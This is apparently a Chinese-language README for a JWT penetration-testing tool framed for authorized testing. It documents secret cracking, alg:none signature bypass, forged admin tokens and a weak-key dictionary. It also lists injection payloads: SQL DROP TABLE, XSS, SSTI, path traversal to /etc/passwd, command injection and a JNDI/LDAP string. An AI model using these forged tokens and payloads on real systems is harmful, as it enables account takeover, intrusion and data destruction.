# JWT 渗透测试工具 (JWT Penetration Tool)

一个功能全面的JWT安全测试工具，专为授权渗透测试设计。支持JWT解码、结构分析、密钥破解、漏洞检测和攻击载荷生成。

## 功能特性

### 🔍 分析功能
- **完整JWT解码**: 解析Header、Payload和Signature
- **PWD结构分析**: 详细显示Base64编码/解码对比
- **深度结构解析**: 参数级别的安全影响分析
- **漏洞扫描**: 自动检测常见JWT安全问题
- **时间戳解析**: 自动解析exp、iat、nbf等时间字段

### ⚔️ 攻击功能
- **密钥破解**: 支持字典攻击和暴力破解
- **算法攻击**: none算法绕过、算法混淆攻击
- **权限提升**: 自动生成admin权限载荷
- **用户身份伪造**: 修改用户标识字段
- **时间操纵**: 延长过期时间、修改签发时间
- **注入攻击**: SQL注入、XSS、SSTI等载荷测试

### 🔧 修改功能
- **交互式修改器**: 友好的GUI式参数修改
- **批量修改**: 自动生成多种攻击变种
- **快速修改**: 命令行参数快速设置
- **签名选项**: 支持多种签名方式(none、自定义密钥等)

### 🤖 自动化功能
- **自动化测试套件**: 一键完整安全测试
- **攻击套件生成**: 自动生成所有可能的攻击载荷
- **批量处理**: 支持多个JWT同时处理
- **详细报告**: 生成专业的渗透测试报告

## 安装要求

- **Python**: 3.6+
- **依赖库**: 
  ```bash
  pip install requests
  ```
- **操作系统**: Linux/Windows/macOS
- **权限**: 无特殊权限要求

## 安装方法

### 下载安装
```bash
# 下载工具
wget https://your-repo/encoder.py
# 或者
curl -O https://your-repo/encoder.py

# 设置执行权限
chmod +x encoder.py

# 安装依赖
pip3 install requests
```

### 验证安装
```bash
python3 encoder.py --help
```

## 基础使用

### 1. JWT解码
```bash
# 基础解码
python3 encoder.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# 从文件读取
python3 encoder.py -f token.txt

# 显示详细PWD结构
python3 encoder.py "token" --show-structure --base64-decode
```

### 2. 安全分析
```bash
# 完整安全分析
python3 encoder.py "token" --analyze

# 仅结构分析
python3 encoder.py "token" --structure

# 仅漏洞扫描
python3 encoder.py "token" --vulnerabilities
```

### 3. 密钥破解
```bash
# 使用默认字典破解
python3 encoder.py "token" --crack

# 使用自定义字典
python3 encoder.py "token" --crack --wordlist passwords.txt

# 多线程破解
python3 encoder.py "token" --crack --threads 8 --max-length 15

# 使用多个字典
python3 encoder.py "token" --crack -w dict1.txt -w dict2.txt -w dict3.txt
```

## 高级使用

### 4. 交互式修改
```bash
# 启动交互式修改器
python3 encoder.py "token" --modify
```

交互式修改器功能：
- 📋 Header字段修改/添加/删除
- 📦 Payload字段修改/添加/删除  
- ⚡ 快速权限提升(一键设置admin)
- ⏰ 时间操纵(延长过期时间等)
- 💉 注入载荷测试(SQL注入、XSS等)
- 🔐 灵活的签名选项

### 5. 命令行快速修改
```bash
# 设置算法为none(无签名)
python3 encoder.py "token" --algorithm none

# 设置admin权限
python3 encoder.py "token" --set-payload "admin=true,role=admin" --algorithm none

# 使用自定义密钥签名
python3 encoder.py "token" --set-payload "user=admin" --secret "mysecret" --algorithm HS256

# 修改Header和Payload
python3 encoder.py "token" --set-header "alg=none,typ=JWT" --set-payload "admin=true,exp=9999999999"
```

### 6. 批量攻击
```bash
# 生成所有可能的攻击变种
python3 encoder.py "token" --batch-modify --output attack_results.txt

# 保存token列表
python3 encoder.py "token" --batch-modify --save-tokens --output attacks

# 处理多个token
python3 encoder.py -f tokens.txt --batch-modify --output batch_results/
```

### 7. 自动化测试套件
```bash
# 运行完整自动化测试
python3 encoder.py "token" --auto-test --output test_results/

# 静默模式运行
python3 encoder.py "token" --auto-test --quiet --output results/
```

自动化测试包含：
1. 📊 基础安全分析
2. 🔓 密钥破解尝试  
3. ⚔️ 攻击载荷生成
4. 🎯 批量攻击执行
5. 📁 结果文件保存
6. 📄 专业测试报告

## 输出选项

### 保存结果
```bash
# 保存为JSON格式
python3 encoder.py "token" --analyze --output analysis.json --format json

# 保存为文本格式
python3 encoder.py "token" --crack --output crack_result.txt --format txt

# 指定输出目录
python3 encoder.py "token" --auto-test --output /path/to/results/
```

### 输出文件说明
- `jwt_analysis_*.json` - 详细分析结果
- `jwt_attacks_*.txt` - 攻击结果列表
- `jwt_tokens_*.txt` - 生成的token列表
- `jwt_report_*.txt` - 专业测试报告

## 实战示例

### 示例1: 发现弱密钥
```bash
$ python3 encoder.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImV4cCI6MTYxMDAwMDAwMH0.X8YxvwlrOd2JfrVYuPJMZn2v3qjhG7qjVh4H8VgNbLc" --crack

[+] 开始破解 HS256 签名...
[+] 字典大小: 1547 个密钥
[+] 找到密钥: 'secret'

[+] 使用破解密钥生成的admin JWT:
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImV4cCI6MTYxMDAwMDAwMCwiYWRtaW4iOnRydWUsInJvbGUiOiJhZG1pbiJ9.rTqMn4vQz9VH3xO9bVq2J4p7dN8wG2mF1sA5K9xE4Vc
```

### 示例2: none算法攻击
```bash
$ python3 encoder.py "token" --set-payload "admin=true" --algorithm none

✅ JWT修改成功!
📦 Payload 修改对比:
  修改前: {"user":"guest","role":"user"}
  修改后: {"user":"guest","role":"user","admin":true}

🎯 生成的Token:
  新Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImFkbWluIjp0cnVlfQ.
```

### 示例3: 完整安全测试
```bash
$ python3 encoder.py "token" --auto-test --output security_test/

🤖 自动化JWT渗透测试套件
================================================================================

[1/6] 基础安全分析...
🔍 JWT 详细安全分析报告
================================================================================
📋 TOKEN 信息:
Token长度: 245 字符
估算安全级别: 高风险

[2/6] 密钥破解测试...
[+] 找到密钥: 'test123'

[3/6] 生成攻击载荷...
[+] 生成 156 个攻击载荷

[4/6] 执行攻击载荷...
[+] 成功生成 143 个变种Token

[5/6] 保存测试结果...
[+] 结果已保存到: security_test/jwt_analysis_1640995200.json
[+] Token列表保存到: security_test/jwt_tokens_1640995200.txt

[6/6] 生成测试报告...
📄 详细报告保存到: security_test/jwt_report_1640995200.txt

✅ 自动化测试完成!
📁 结果保存在: security_test/
```

## 攻击载荷类型

### 算法攻击
- `alg: none` - 移除签名验证
- `alg: None/NONE` - 大小写绕过
- `alg: null/NULL` - 空值绕过
- `alg: ""` - 空字符串

### 权限提升
- `admin: true/1/"admin"`
- `role: "admin"/"root"/"administrator"`
- `is_admin: true`
- `permission: "admin"`
- `authority: "admin"`

### 用户伪造
- `user/username/sub: "admin"`
- `user_id/uid/id: 0/1`

### 时间操纵
- `exp: 延长过期时间`
- `iat: 修改签发时间`
- `nbf: 修改生效时间`

### 注入攻击
- **SQL注入**: `' OR '1'='1`, `'; DROP TABLE users; --`
- **XSS**: `<script>alert(1)</script>`, `"><script>alert(1)</script>`
- **SSTI**: `{{7*7}}`, `${7*7}`, `<%=7*7%>`
- **路径遍历**: `../../../etc/passwd`
- **命令注入**: `; id`, `| whoami`, `$(id)`
- **LDAP注入**: `${jndi:ldap://127.0.0.1/a}`

## 默认密钥字典

工具内置了丰富的密钥字典，包括：

### 常见弱密钥
```
secret, password, key, admin, guest, user, root
123456, 123456789, qwerty, abc123, password123
jwt, token, auth, session, login, test, demo
```

### JWT特定密钥
```
jwt-key, jwtkey, jwt_secret, jwtsecret, jwt-secret
HS256, HS384, HS512, hmac, signature, sign
```

### 应用密钥
```
secretkey, app_secret, application_secret, api_key
private_key, public_key, master_key, session_secret
```

### Base64编码密钥
```
c2VjcmV0 (secret), cGFzc3dvcmQ= (password)
YWRtaW4= (admin), dGVzdA== (test)
```

## 命令行参数详解

### 输入选项
```bash
token                    # 直接提供JWT token
-f, --file FILE         # 从文件读取token
--stdin                 # 从标准输入读取
```

### 分析选项
```bash
-a, --analyze           # 完整安全分析
--structure             # JWT结构解析
--vulnerabilities       # 漏洞扫描
--show-structure        # 详细PWD结构显示
--base64-decode         # 显示Base64解码内容
```

### 修改选项
```bash
-m, --modify            # 交互式修改
--set-header KEY=VAL    # 设置header字段
--set-payload KEY=VAL   # 设置payload字段
--algorithm ALG         # 设置算法
--secret SECRET         # 签名密钥
```

### 破解选项
```bash
-c, --crack             # 破解密钥
-w, --wordlist FILE     # 字典文件(可多次使用)
--max-length N          # 暴力破解最大长度
--threads N             # 破解线程数
```

### 批量选项
```bash
--batch-modify          # 批量生成攻击变种
--auto-test             # 自动化测试套件
```

### 输出选项
```bash
-o, --output PATH       # 输出文件/目录
--format FORMAT         # 输出格式(json/txt)
--quiet                 # 静默模式
--save-tokens           # 保存生成的token
```

## 安全注意事项

### ⚠️ 重要提醒
- **仅用于授权测试**: 此工具仅应用于您有权限测试的系统
- **遵守法律法规**: 请遵守当地法律和公司政策
- **负责任披露**: 发现漏洞请负责任地报告给相关方
- **测试环境**: 建议先在测试环境中验证

### 🛡️ 防御建议
基于工具发现的问题，建议开发者：

1. **使用强密钥**: 避免使用弱密钥，推荐随机生成的长密钥
2. **选择安全算法**: 使用RS256/ES256等非对称算法
3. **正确验证**: 确保服务端正确验证JWT签名和声明
4. **最小权限原则**: 不要在JWT中存储敏感信息
5. **合理过期时间**: 设置合理的token过期时间
6. **密钥轮换**: 定期轮换签名密钥

## 故障排除

### 常见问题

**Q: 提示"不是有效的JWT格式"**
```bash
# 检查token格式，确保包含两个点号
# 正确格式: header.payload.signature
```

**Q: 密钥破解失败**
```bash
# 尝试增加字典或提高最大长度
python3 encoder.py "token" --crack --max-length 20 --threads 8
```

**Q: 修改后的token验证失败**
```bash
# 检查目标系统是否正确验证签名
# 尝试使用none算法绕过
python3 encoder.py "token" --algorithm none
```

**Q: 批量处理内存占用高**
```bash
# 减少并发线程数
python3 encoder.py "token" --crack --threads 2
```

### 调试模式
```bash
# 显示详细信息
python3 encoder.py "token" --analyze --show-structure --base64-decode

# 保存中间结果
python3 encoder.py "token" --auto-test --output debug/ --format json
```

## 更新日志

### v1.0.0 (当前版本)
- ✅ 完整JWT解码和分析
- ✅ 高级密钥破解功能  
- ✅ 交互式修改器
- ✅ 批量攻击生成
- ✅ 自动化测试套件
- ✅ 详细安全报告

### 计划功能
- 🔄 RSA/ECDSA算法支持
- 🔄 GUI界面
- 🔄 插件系统
- 🔄 更多注入载荷
- 🔄 云端字典同步

## 贡献指南

欢迎提交Issue和Pull Request来帮助改进此工具：

1. Fork 项目仓库
2. 创建功能分支
3. 提交代码改动
4. 创建Pull Request

### 开发环境
```bash
git clone https://github.com/your-repo/jwt-tool.git
cd jwt-tool
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## 许可证

此工具基于MIT许可证发布，仅供教育和授权安全测试使用。

## 联系方式

- **作者**: [awlike]
- **邮箱**: [ke788341@gmail.com]
- **项目**: [https://github.com/likeaw/python-tools]

---

**免责声明**: 此工具仅用于授权的安全测试。使用者需对使用此工具的行为负责，开发者不承担任何法律责任。
